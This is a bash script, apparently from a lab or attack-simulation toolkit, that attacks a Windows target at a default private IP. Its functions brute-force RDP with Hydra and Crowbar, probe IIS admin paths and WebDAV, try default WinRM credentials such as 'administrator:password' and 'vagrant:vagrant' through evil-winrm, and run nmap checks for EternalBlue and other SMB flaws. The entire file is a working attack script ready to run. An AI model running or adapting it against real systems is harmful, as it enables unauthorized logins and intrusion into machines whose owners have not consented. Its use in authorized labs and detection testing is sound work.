#!/bin/bash
###############################################################################
# Windows Attack Script
# RDP brute force, IIS scanning, WinRM enumeration, EternalBlue scanning
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.21}"
TARGET_PORT="${3:-3389}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
WIN_USERS="${WORDLISTS_DIR}/windows_users.txt"

mkdir -p "$RESULTS_DIR"

echo "[*] Windows attacks: $SUBTYPE against ${TARGET_IP}"

run_rdp_brute() {
    echo "[*] RDP brute force"

    # Nmap RDP detection
    nmap -p 3389 --script=rdp-enum-encryption,rdp-ntlm-info \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_rdp.txt" 2>&1 || true

    # Hydra RDP brute force
    if command -v hydra &>/dev/null; then
        echo "[*] Hydra RDP brute force..."
        local user_file="$WIN_USERS"
        [[ ! -f "$user_file" ]] && user_file="${WORDLISTS_DIR}/small_users.txt"

        hydra -L "$user_file" \
              -P "${WORDLISTS_DIR}/small_passwords.txt" \
              -t 4 -f \
              "${TARGET_IP}" rdp 2>&1 | tee "${RESULTS_DIR}/rdp_brute.txt" || true
    fi

    # Crowbar RDP brute force (if available)
    if command -v crowbar &>/dev/null; then
        echo "[*] Crowbar RDP brute force..."
        crowbar -b rdp -s "${TARGET_IP}/32" \
            -U "${WORDLISTS_DIR}/small_users.txt" \
            -C "${WORDLISTS_DIR}/small_passwords.txt" \
            -n 4 2>&1 | tee "${RESULTS_DIR}/rdp_crowbar.txt" || true
    fi

    echo "[+] RDP brute force complete"
}

run_iis_scan() {
    echo "[*] IIS vulnerability scanning"

    # Nmap IIS scripts
    nmap -p 80,8080 --script=http-iis-webdav-vuln,http-iis-short-name-brute \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_iis.txt" 2>&1 || true

    # Nikto against IIS
    if command -v nikto &>/dev/null; then
        nikto -h "$TARGET_IP" -p 80 \
            -Format txt -output "${RESULTS_DIR}/nikto_iis.txt" \
            -maxtime 300 2>&1 || true
    fi

    # IIS-specific path probes
    echo "[*] IIS path enumeration..."
    local paths=(
        "/_vti_bin/shtml.dll" "/_vti_bin/_vti_aut/author.dll"
        "/iisadmpwd/aexp.htr" "/iisadmpwd/aexp2.htr"
        "/scripts/iisadmin/ism.dll" "/scripts/tools/newdsn.exe"
        "/trace.axd" "/elmah.axd" "/.aspx" "/web.config"
        "/aspnet_client/" "/App_Data/" "/bin/"
        "/iisstart.htm" "/IISHelp/" "/_layouts/"
    )

    for path in "${paths[@]}"; do
        curl -sk "http://${TARGET_IP}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/iis_paths.txt" 2>&1 || true
        sleep 0.3
    done

    # WebDAV methods testing
    echo "[*] Testing WebDAV methods..."
    curl -sk -X OPTIONS "http://${TARGET_IP}/" \
        -o /dev/null -D - \
        > "${RESULTS_DIR}/iis_options.txt" 2>&1 || true

    curl -sk -X PROPFIND "http://${TARGET_IP}/" \
        -H "Depth: 1" \
        > "${RESULTS_DIR}/iis_propfind.txt" 2>&1 || true

    echo "[+] IIS scanning complete"
}

run_winrm() {
    echo "[*] WinRM enumeration"

    # Check WinRM port
    nmap -p 5985,5986 -sV "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_winrm.txt" 2>&1 || true

    # Try WinRM authentication
    echo "[*] Testing WinRM credentials..."
    local creds=("administrator:password" "vagrant:vagrant" "admin:admin"
                 "administrator:P@ssw0rd" "administrator:vagrant")

    for cred in "${creds[@]}"; do
        user="${cred%%:*}"
        pass="${cred#*:}"
        echo "[*] Trying: ${user}:${pass}"

        # evil-winrm if available
        if command -v evil-winrm &>/dev/null; then
            timeout 10 evil-winrm -i "$TARGET_IP" -u "$user" -p "$pass" \
                -c "whoami" 2>&1 | head -5 \
                >> "${RESULTS_DIR}/winrm_attempts.txt" || true
        fi

        # curl-based WSMAN probe
        curl -sk "http://${TARGET_IP}:5985/wsman" \
            -u "${user}:${pass}" \
            --ntlm \
            -o /dev/null -w "  ${user}:${pass} -> %{http_code}\n" \
            >> "${RESULTS_DIR}/winrm_attempts.txt" 2>&1 || true
        sleep 1
    done

    echo "[+] WinRM enumeration complete"
}

run_smb_ms17() {
    echo "[*] EternalBlue (MS17-010) scanning"

    # Nmap MS17-010 check
    nmap -p 445 --script=smb-vuln-ms17-010 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_ms17.txt" 2>&1 || true

    # Additional SMB vulnerability checks
    nmap -p 445 --script=smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_smb_vulns.txt" 2>&1 || true

    # SMB version enumeration
    nmap -p 445 --script=smb-protocols,smb2-security-mode \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_smb_version.txt" 2>&1 || true

    echo "[+] EternalBlue scanning complete"
}

case "$SUBTYPE" in
    rdp_brute)  run_rdp_brute ;;
    iis_scan)   run_iis_scan ;;
    winrm)      run_winrm ;;
    smb_ms17)   run_smb_ms17 ;;
    full)
        run_rdp_brute
        sleep 5
        run_iis_scan
        sleep 5
        run_winrm
        sleep 5
        run_smb_ms17
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: rdp_brute, iis_scan, winrm, smb_ms17, full"
        exit 1
        ;;
esac

echo "[*] Windows attack script complete"
